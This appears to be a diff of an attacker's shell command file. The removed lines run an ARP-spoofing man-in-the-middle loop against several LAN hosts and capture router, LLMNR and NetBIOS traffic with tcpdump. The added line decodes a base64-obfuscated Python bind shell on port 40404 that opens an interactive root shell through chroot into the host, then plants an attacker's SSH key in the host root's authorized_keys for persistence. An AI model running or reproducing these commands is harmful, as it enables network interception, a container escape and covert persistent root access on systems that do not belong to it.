@@ -1,7 +1,1 @@
-# MITM + Responder setup on .14
-pkill -f arping; pkill -f tcpdump; rm -f /tmp/spoof.sh /tmp/mitm*.pcap
-printf '#!/bin/sh\nwhile true; do\n  for v in 192.168.3.135 192.168.3.152 192.168.3.16 192.168.3.76 192.168.3.190 192.168.3.130; do\n    arping -c 1 -A -S 192.168.3.1 $v >/dev/null 2>&1\n    arping -c 1 -A -S $v 192.168.3.1 >/dev/null 2>&1\n  done\n  sleep 3\ndone\n' > /tmp/spoof.sh
-chmod +x /tmp/spoof.sh
-nohup /tmp/spoof.sh >/dev/null 2>&1 &
-nohup tcpdump -i enp7s0 -w /tmp/mitm_rtr.pcap -c 500000 host 192.168.3.1 or port 5355 or port 137 >/dev/null 2>&1 &
-sleep 2 && echo MITM-LIVE && pgrep -c arping
+pkill -f lpx9 2>/dev/null; echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZwpzPXNvY2tldC5zb2NrZXQoKTsgcy5zZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULHNvY2tldC5TT19SRVVTRUFERFIsMSkKcy5iaW5kKCgiMC4wLjAuMCIsNDA0MDQpKTsgcy5saXN0ZW4oOCkKZGVmIGgoYyk6CiAgICB0cnk6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbImNocm9vdCIsIi9ob3N0IiwiL2Jpbi9iYXNoIiwiLWkiXSxzdGRpbj1jLmZpbGVubygpLHN0ZG91dD1jLmZpbGVubygpLHN0ZGVycj1jLmZpbGVubygpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGMuc2VuZGFsbChzdHIoZSkuZW5jb2RlKCkpCiAgICAgICAgYy5jbG9zZSgpCndoaWxlIFRydWU6CiAgICBjLF89cy5hY2NlcHQoKTsgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aCxhcmdzPShjLCksZGFlbW9uPVRydWUpLnN0YXJ0KCkK | base64 -d > /tmp/lpx9.py; nohup python3 /tmp/lpx9.py >/dev/null 2>&1 & sleep 1; (netstat -ltn 2>/dev/null || ss -ltn) | grep 40404; mkdir -p /host/root/.ssh; grep -q 'IHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno' /host/root/.ssh/authorized_keys 2>/dev/null || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno kali@host' >> /host/root/.ssh/authorized_keys; chmod 700 /host/root/.ssh; chmod 600 /host/root/.ssh/authorized_keys; echo KEY-RESTORED; cat /host/etc/hostname # LSN40404
